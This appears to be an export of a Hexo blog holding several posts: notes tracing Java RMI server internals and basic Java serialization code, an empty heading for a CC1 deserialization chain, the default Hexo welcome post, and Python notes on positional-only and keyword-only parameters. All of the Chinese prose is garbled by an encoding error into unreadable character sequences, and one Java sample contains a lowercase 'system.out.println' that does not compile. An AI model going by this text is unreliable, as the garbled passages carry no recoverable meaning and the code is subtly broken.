<h2 id="ğŸŒŸè¡¥å……ï¼š"><a href="#ğŸŒŸè¡¥å……ï¼š" class="headerlink" title="ğŸŒŸè¡¥å……ï¼š"></a>ğŸŒŸè¡¥å……ï¼š</h2><h2 id="ğŸŒŸå…³äºrmiæœåŠ¡çš„å…·ä½“æµç¨‹è°ƒè¯•"><a href="#ğŸŒŸå…³äºrmiæœåŠ¡çš„å…·ä½“æµç¨‹è°ƒè¯•" class="headerlink" title="ğŸŒŸå…³äºrmiæœåŠ¡çš„å…·ä½“æµç¨‹è°ƒè¯•"></a>ğŸŒŸå…³äºrmiæœåŠ¡çš„å…·ä½“æµç¨‹è°ƒè¯•</h2><p>å‚è€ƒæ–‡ç« å’Œè§†é¢‘ï¼ˆæˆ‘è®¤ä¸ºè®²çš„ç‰¹åˆ«å¥½ï¼Œå¼ºçƒˆæ¨èï¼ï¼‰</p>
<p><a href="https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</a></p>
<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?p=3&spm_id_from=pageDriver&vd_source=2e4979b0a36df1ed7510f03f3d33843f">https://www.bilibili.com/video/BV1L3411a7ax/?p=3&amp;spm_id_from=pageDriver&amp;vd_source=2e4979b0a36df1ed7510f03f3d33843f</a></p>
<h3 id="1ã€è¿œç¨‹å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹"><a href="#1ã€è¿œç¨‹å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹" class="headerlink" title="1ã€è¿œç¨‹å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹"></a>1ã€è¿œç¨‹å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹</h3><p>ä¸»è¦çš„ä½œç”¨ç‚¹å°±åœ¨è¿œç¨‹æ–¹æ³•æ‰€ç»§æ‰¿çš„UnicastRemoteObjectç±»ä¸­ï¼Œæ˜¯ç”¨äºå°†æœ¬åœ°æ–¹æ³•å‘å¸ƒçš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/449e96cbf56cb91ce5fea4b44d8b8a9d--7f10--image-20240309103527834.png" alt="image-20240309103527834"></p>
<p>ç„¶åå°±æ˜¯ç”±äºç«¯å£æ˜¯æœªçŸ¥çš„ï¼Œç«¯å£ä¸ºé›¶ï¼Œç„¶åè°ƒç”¨exportObjectæ–¹æ³•åŒºå°†æ–¹æ³•ç»™å‘å¸ƒï¼ŒexportObjectå°±æ˜¯å‘å¸ƒçš„é‡è¦å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›ï¼Œå°±ä¼šå‘ç°æ˜¯åœ¨ä¸€å±‚å±‚å»è°ƒç”¨ä¸åŒç±»ä¸­çš„exportObjectå‡½æ•°</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/06d268d7507144247ead0bb8c9255342--2361--image-20240309103730436.png" alt="image-20240309103730436"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/7ad2af7b7010c5f18072cee984418b57--edf1--image-20240309103742756.png" alt="image-20240309103742756"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/5f99a7d5c8eec788788dad375fdea453--4636--image-20240309103823798.png" alt="image-20240309103823798"></p>
<p>æœ€ååœ¨è¿™é‡Œï¼Œä¼šå‘ç°ä¸€ä¸ªcreateProxyï¼Œçœ‹åå­—å°±èƒ½çœ‹å‡ºæ¥ï¼Œæ˜¯ä¸€ä¸ªåˆ›å»ºä»£ç†çš„æ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/fba392778289afa99fadb0b2d1d04f80--716c--image-20240309104011784.png"></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªåˆ¤æ–­æ˜¯å¦æœ‰_stubåç¼€çš„æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±åˆ›å»ºä¸€ä¸ªï¼Œåè¾¹å°±æ˜¯ä¸€äº›ä¸å¤ªå¥½ç†è§£çš„ä¸œè¥¿äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/09d963caced12b347a0198ea8d71cedd--9e31--image-20240309104201242.png" alt="image-20240309104201242"></p>
<p>ç„¶åå°±è·³åˆ°äº†è¿™é‡Œï¼Œæˆ‘ä»¬è·Ÿè¿›å‡½æ•°ï¼Œå‘ç°ä¹Ÿæ˜¯ä¸€ä¸ªåˆ¤æ–­_Skelåç¼€çš„æ–¹æ³•ï¼Œåœ¨ç»§ç»­è°ƒè¯•ï¼Œå‘ç°åˆ›å»ºäº†ä¸€ä¸ªTargetï¼Œä¸€ä¸ªå¾ˆå…³é”®çš„ä¸œè¥¿</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/307c578130cd22ddfc56de56ca7d50ca--06fe--image-20240309104525491.png" alt="image-20240309104525491"></p>
<p>é‡Œé¢æŠŠæ‰€æœ‰ç›¸å…³çš„studï¼ŒIDç­‰éƒ½è®°å½•è¿›å»äº†ï¼Œç„¶åå°±åˆæ˜¯ä¸€ç³»åˆ—çš„exportObjectå»å°†Targetç»™å‘å¸ƒå‡ºå»äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/c95a79909fbc8ca393b09350ffebb05f--a583--image-20240309104817139.png" alt="image-20240309104817139"></p>
<p>æœ€åå‘ç°æœåŠ¡ç«¯è¿˜ä¼šå»ºä¸€å¼ è¡¨ï¼Œå»å°†Targetç»™å­˜å…¥å…¶ä¸­ï¼Œä»è€Œä¿ç•™è®©æœåŠ¡ç«¯çŸ¥é“æœ‰å…³è¿™ä¸ªè¿œç¨‹æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p>
<p>è¿™å·®ä¸å¤š å°±æ˜¯è¿œç¨‹æ–¹æ³•çš„åˆ›å»ºçš„è¿‡ç¨‹äº†</p>
<h3 id="2ã€æ³¨å†Œä¸­å¿ƒçš„åˆ›å»º"><a href="#2ã€æ³¨å†Œä¸­å¿ƒçš„åˆ›å»º" class="headerlink" title="2ã€æ³¨å†Œä¸­å¿ƒçš„åˆ›å»º"></a>2ã€æ³¨å†Œä¸­å¿ƒçš„åˆ›å»º</h3><p>ç›¸æ¯”æ¥è¯´æ³¨å†Œä¸­å¿ƒçš„åˆ›å»ºå°±ç®€å•å¾ˆå¤šäº†ï¼Œæˆ‘ä»¬ç›´æ¥è°ƒè¯•è·Ÿè¿›</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/73441644e29781969609c21fda9ca8fe--2d0d--image-20240309105935201.png" alt="image-20240309105935201"></p>
<p>åœ¨è¿™é‡Œå°±å‘ç°äº†é‡ç‚¹â€”â€“LiveRef</p>
<blockquote>
<p>åœ¨ä¸Šé¢ä¹‹å‰å¿˜è®°å°†äº†ï¼ŒLiveRefåˆæ˜¯ä»€ä¹ˆï¼Œè¿™æ˜¯ä¸€ä¸ªåœ¨rmiè¿œç¨‹æ–¹æ³•è°ƒç”¨ä¸­éå¸¸é‡è¦çš„ä¸€ä¸ªï¼Œä»–å…¶ä¸­å°è£…äº†æœåŠ¡ç«¯ä¸­æ‰€æœ‰ç›¸å…³çš„ä¿¡æ¯ï¼Œæ¯”å¦‚è¿œç¨‹æ–¹æ³•çš„IDï¼Œåœ°å€å’Œç«¯å£ï¼Œä»¥åŠå„ç§ä¿¡æ¯</p>
</blockquote>
<p>ç„¶åå°±å‘ç°æ˜¯è°ƒç”¨TCPEndpointï¼Œå»è·å–æœ¬åœ°çš„EndpointæœåŠ¡ï¼Œä»è€Œä»¥æ­¤å»å®Œæˆç›¸å…³TCPæœåŠ¡çš„æ“ä½œã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/d772f29e62f647771bd36cdf2c484757--4802--image-20240309110603314.png" alt="image-20240309110603314"></p>
<p>å‘ç°å°±åˆæ˜¯exportObjectæ–¹æ³•ï¼Œå‘ç°åè¾¹å°±æ˜¯å’Œä¹‹å‰çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨åŸºæœ¬å°±æ˜¯ä¸€è‡´çš„äº†ï¼Œå°±èƒ½å¤ŸçŸ¥é“æ³¨å†Œä¸­å¿ƒçš„åˆ›å»ºï¼Œå…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªè¿œç¨‹æ–¹æ³•çš„å‘å¸ƒè¿‡ç¨‹å®é™…ä¸Šã€‚</p>
<h3 id="3ã€è¿œç¨‹æ–¹æ³•ç»‘å®š"><a href="#3ã€è¿œç¨‹æ–¹æ³•ç»‘å®š" class="headerlink" title="3ã€è¿œç¨‹æ–¹æ³•ç»‘å®š"></a>3ã€è¿œç¨‹æ–¹æ³•ç»‘å®š</h3><p>è¿™é‡Œå°±æ¯”è¾ƒç®€å•äº†ï¼Œå› ä¸ºè¿™é‡Œå¹¶ä¸æ˜¯è¿œç¨‹ç»‘å®šï¼Œå°±ç›´æ¥è°ƒç”¨äº†RegistryImplç±»ï¼ŒæŠŠåå­—å’Œè¿œç¨‹å¯¹è±¡æ”¾åˆ°ä¸€ä¸ªå«bindingsçš„HashTableé‡Œé¢ã€‚<br>åˆ°è¿™é‡ŒæœåŠ¡ç«¯çš„æµç¨‹å°±èµ°å®Œäº†ã€‚</p>
<h1 id="ä¸‰ã€serializeğŸŒŸ"><a href="#ä¸‰ã€serializeğŸŒŸ" class="headerlink" title="ä¸‰ã€serializeğŸŒŸ"></a>ä¸‰ã€serializeğŸŒŸ</h1><p>è¿™æ˜¯å­¦ä¹ çš„é‡éš¾ç‚¹ï¼Œæˆ‘ç°åœ¨ä¹Ÿè¿˜çŸ¥è¯†åˆæ­¥äº†è§£ä¸€äº›ï¼Œè¿˜æ²¡å®Œå…¨å¼„å®ŒğŸ˜­</p>
<p>ä¸€èˆ¬webæ‰‹åˆè¯†ååºåˆ—åŒ–éƒ½æ˜¯ä»phpå¼€å§‹ï¼Œé¦–å…ˆå°±javaçš„ååºåˆ—åŒ–å’Œphpçš„è¿˜æ˜¯æœ‰å¾ˆå¤§åŒºåˆ«çš„ï¼Œphpæ˜¯ç›´æ¥åˆ©ç”¨serializeå’Œunserializeè¿™ä¸¤ä¸ªå‡½æ•°è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬æ— æ³•å»æ§åˆ¶è¿™ä¸ªè¿‡ç¨‹ä¸­çš„ä»»ä½•ä¸œè¥¿ï¼Œè€Œjavaå°±ä¸ä¸€æ ·äº†ã€‚</p>
<blockquote>
<ul>
<li>writeObjectï¼šåºåˆ—åŒ–</li>
<li>readObjectï¼šååºåˆ—åŒ–</li>
</ul>
</blockquote>
<p>è¿™ä¸¤ä¸ªä¸»è¦æ˜¯javaä¸­åºåˆ—åŒ–ååºåˆ—åŒ–æ‰€éœ€è¦ä½¿ç”¨åˆ°çš„ï¼Œä¸€èˆ¬éœ€è¦æ­é…ä¸€äº›å…¶ä»–çš„ä¸œè¥¿å»ä½¿ç”¨ã€‚</p>
<p>eg</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//ç”¨äºä¿å­˜åºåˆ—åŒ–æ•°æ®</span></span><br><span class="line">     ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);   <span class="comment">//å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµ</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">     u.setName(<span class="string">&quot;6pc1&quot;</span>);</span><br><span class="line">     obj_out.writeObject(u);   <span class="comment">//åˆ©ç”¨writeObjectæ–¹æ³•å°†åºåˆ—åŒ–å¯¹è±¡å­˜å‚¨åœ¨æœ¬åœ°</span></span><br><span class="line">     obj_out.close();</span><br><span class="line">     System.out.println(<span class="string">&quot;Userå¯¹è±¡åºåˆ—åŒ–æˆåŠŸï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//è¯»å–ä¹‹å‰ä¿å­˜çš„åºåˆ—åŒ–æ•°æ®</span></span><br><span class="line">     <span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);  <span class="comment">//å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡è¾“å…¥æµ</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> (User)ins.readObject();      <span class="comment">//åˆ©ç”¨readObjectæ–¹æ³•å°†åºåˆ—åŒ–å¯¹è±¡è½¬ä¸ºå¯¹è±¡</span></span><br><span class="line">     system.out.println(<span class="string">&quot;Userå¯¹è±¡ååºåˆ—åŒ–æˆåŠŸï¼&quot;</span>);</span><br><span class="line">     System.out.println(u.getName());</span><br><span class="line">     ins.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æ˜¯javaååºåˆ—è¯çš„ä¸»è¦è¿‡ç¨‹ï¼Œæ˜¯å¯ä»¥è‡ªå·±å»æ“ä½œåºåˆ—åŒ–ååºåˆ—åŒ–çš„ä¸€äº›è¿‡ç¨‹çš„ï¼Œå°±æ¯”å¦‚åœ¨åºåˆ—åŒ–åçš„æ–‡ä»¶ä¸­æ·»åŠ ä¸€äº›æ•°æ®ä¸€ç±»çš„</p>
<p>è¿™ä¹Ÿä¸æ˜¯å”¯ä¸€ä¸€ç§ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨byteæµçš„æ–¹æ³•ä»£æ›¿æ–‡ä»¶æµ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br></pre></td></tr></table></figure>

<h1 id="å››ã€CC1é“¾"><a href="#å››ã€CC1é“¾" class="headerlink" title="å››ã€CC1é“¾"></a>å››ã€CC1é“¾</h1>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>serialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/11/06/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>pythonå­¦ä¹ å†ç¨‹(1)</title>
    <url>/2023/11/11/python%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B-1/</url>
    <content><![CDATA[<p>æœ€è¿‘ä¹Ÿæ˜¯å¤§äºŒäº†ï¼Œå¥½ä¸å®¹æ˜“ç»ˆäºæ¥åˆ°äº†å¤§åˆ›äº†ï¼Œä¸è¿‡å¤§åˆ›éœ€è¦æˆ‘ä»¬å»æ·±å…¥å­¦ä¹ pythonï¼ŒåŠ ä¸Šæ‰“ç®—å»å‚åŠ ä¸€ä¸ªpythonçš„é¡¹ç›®åˆ¶ä½œï¼Œå†å»æƒ³æƒ³æˆ‘é‚£pythonæ°´å¹³ï¼Œç®€ç›´ä¸€è¨€éš¾å°½ï¼Œåªèƒ½æŠ“ç´§æ—¶é—´èµ¶å¿«è¡¥äº†ğŸ˜±</p>
<p>è¿™é‡Œå°±ç®€å•è®°å½•ä¸€ä¸‹ä¸€äº›æˆ‘æ²¡æœ‰ä»€ä¹ˆå°è±¡çš„æˆ–è€…æ„Ÿè§‰æ¯”è¾ƒé‡è¦çš„çŸ¥è¯†ç‚¹ã€‚</p>
<span id="more"></span>

<h1 id="ä¸€ã€pythonå‚æ•°ä¸­çš„ä¸€äº›ç‰¹æ®Šå‚æ•°"><a href="#ä¸€ã€pythonå‚æ•°ä¸­çš„ä¸€äº›ç‰¹æ®Šå‚æ•°" class="headerlink" title="ä¸€ã€pythonå‚æ•°ä¸­çš„ä¸€äº›ç‰¹æ®Šå‚æ•°"></a>ä¸€ã€pythonå‚æ•°ä¸­çš„ä¸€äº›ç‰¹æ®Šå‚æ•°</h1><p>é¦–å…ˆå°±éœ€è¦å…ˆå»äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ä½ç½®å‚æ•°å’Œå…³é”®å­—å‚æ•°åˆ†åˆ«æ˜¯ä»€ä¹ˆã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line">    </span><br><span class="line">standard_arg(<span class="number">123</span>)   //ä½ç½®å‚æ•°ï¼Œå¤šä¸ªå‚æ•°éœ€è¦æ³¨æ„æ’åºä½ç½®</span><br><span class="line">standard_arg(arg=<span class="number">21</span>)   //å…³é”®å­—å‚æ•°</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°å®šä¹‰ä¸­æœªä½¿ç”¨ <code>/</code> å’Œ <code>*</code> æ—¶ï¼Œå‚æ•°å¯ä»¥æŒ‰ä½ç½®æˆ–å…³é”®å­—ä¼ é€’ç»™å‡½æ•°ã€‚</p>
<h2 id="1ã€ä»…ä½ç½®å‚æ•°"><a href="#1ã€ä»…ä½ç½®å‚æ•°" class="headerlink" title="1ã€ä»…ä½ç½®å‚æ•°"></a>1ã€ä»…ä½ç½®å‚æ•°</h2><p>ä»…é™ä½ç½®æ—¶ï¼Œå½¢å‚çš„é¡ºåºå¾ˆé‡è¦ï¼Œå¹¶ä¸”è¿™äº›å‚æ•°åœ¨ä¼ å‚æ—¶å¿…é¡»ä½¿ç”¨ä½ç½®å‚æ•°ä¼ å‚</p>
<p>ä»…é™ä½ç½®å½¢å‚åº”æ”¾åœ¨ <code>/</code> ï¼ˆæ­£æ–œæ ï¼‰å‰ã€‚<code>/</code> ç”¨äºåœ¨é€»è¾‘ä¸Šåˆ†å‰²ä»…é™ä½ç½®å½¢å‚ä¸å…¶å®ƒå½¢å‚ã€‚å¦‚æœå‡½æ•°å®šä¹‰ä¸­æ²¡æœ‰ <code>/</code>ï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰ä»…é™ä½ç½®å½¢å‚</p>
<h2 id="2ã€ä»…å…³é”®è¯å‚æ•°"><a href="#2ã€ä»…å…³é”®è¯å‚æ•°" class="headerlink" title="2ã€ä»…å…³é”®è¯å‚æ•°"></a>2ã€ä»…å…³é”®è¯å‚æ•°</h2><p>æŠŠå½¢å‚æ ‡è®°ä¸º <em>ä»…é™å…³é”®å­—</em>ï¼Œè¡¨æ˜å¿…é¡»ä»¥å…³é”®å­—å‚æ•°å½¢å¼ä¼ é€’è¯¥å½¢å‚ï¼Œåº”åœ¨å‚æ•°åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ª <em>ä»…é™å…³é”®å­—</em> å½¢å‚å‰æ·»åŠ  <code>*</code>ã€‚</p>
<h2 id="3ã€å®ä¾‹"><a href="#3ã€å®ä¾‹" class="headerlink" title="3ã€å®ä¾‹"></a>3ã€å®ä¾‹</h2><p>è¯·çœ‹ä¸‹é¢çš„å‡½æ•°å®šä¹‰ç¤ºä¾‹ï¼Œæ³¨æ„ <code>/</code> å’Œ <code>*</code> æ ‡è®°ï¼š</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">pos_only_arg</span>(<span class="params">arg, /</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">kwd_only_arg</span>(<span class="params">*, arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">combined_example</span>(<span class="params">pos_only, /, standard, *, kwd_only</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(pos_only, standard, kwd_only)</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªå‡½æ•°å®šä¹‰ <code>standard_arg</code> æ˜¯æœ€å¸¸è§çš„å½¢å¼ï¼Œå¯¹è°ƒç”¨æ–¹å¼æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œå¯ä»¥æŒ‰ä½ç½®ä¹Ÿå¯ä»¥æŒ‰å…³é”®å­—ä¼ é€’å‚æ•°ï¼š</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(arg=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªå‡½æ•° <code>pos_only_arg</code> çš„å‡½æ•°å®šä¹‰ä¸­æœ‰ <code>/</code>ï¼Œä»…é™ä½¿ç”¨ä½ç½®å½¢å‚ï¼š</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(arg=<span class="number">1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: pos_only_arg() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;arg&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰ä¸ªå‡½æ•° <code>kwd_only_args</code> çš„å‡½æ•°å®šä¹‰é€šè¿‡ <code>*</code> è¡¨æ˜ä»…é™å…³é”®å­—å‚æ•°ï¼š</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: kwd_only_arg() takes <span class="number">0</span> positional arguments but <span class="number">1</span> was given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(arg=<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€ä¸ªå‡½æ•°åœ¨åŒä¸€ä¸ªå‡½æ•°å®šä¹‰ä¸­ï¼Œä½¿ç”¨äº†å…¨éƒ¨ä¸‰ç§è°ƒç”¨æƒ¯ä¾‹ï¼š</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(pos_only=<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;pos_only&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„å‡½æ•°å®šä¹‰ä¸­ï¼Œ<code>kwds</code> æŠŠ <code>name</code> å½“ä½œé”®ï¼Œå› æ­¤ï¼Œå¯èƒ½ä¸ä½ç½®å‚æ•° <code>name</code> äº§ç”Ÿæ½œåœ¨å†²çªï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, **kwds</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨è¯¥å‡½æ•°ä¸å¯èƒ½è¿”å› <code>True</code>ï¼Œå› ä¸ºå…³é”®å­— <code>&#39;name&#39;</code> æ€»ä¸ç¬¬ä¸€ä¸ªå½¢å‚ç»‘å®šã€‚ä¾‹å¦‚ï¼š</p>
<p>&gt;&gt;&gt;</p>
